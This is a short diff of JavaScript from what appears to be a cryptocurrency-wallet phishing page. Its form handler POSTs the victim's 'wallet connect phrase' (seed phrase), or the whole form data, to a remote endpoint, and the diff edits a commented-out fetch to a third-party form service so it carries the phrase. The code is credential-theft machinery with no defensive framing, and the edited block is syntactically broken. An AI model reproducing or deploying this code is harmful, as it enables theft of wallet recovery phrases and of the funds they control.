@@ -2076,8 +2076,8 @@ formS.addEventListener('submit', (event) => {
           Accept: "application/json",
         },
         body: JSON.stringify({
-          message: "wallet connect phrase: "+ phraseText,
-        }),
+          message: formData,
+        })
       })
         .then(function (response) {
         console.log(response);
@@ -2094,7 +2094,9 @@ setTimeout(() => { proceed();}, 2000);
     
    /** fetch('https://usebasin.com/f/dd8b9621a326', { //sd
     method: 'POST',
-    body: formData // pass form data as the request body
+    body: JSON.stringify({
+          message: "wallet connect phrase: "+ phraseText,
+        }),formData // pass form data as the request body
   })
   .then(response => {
     if (response.ok) {
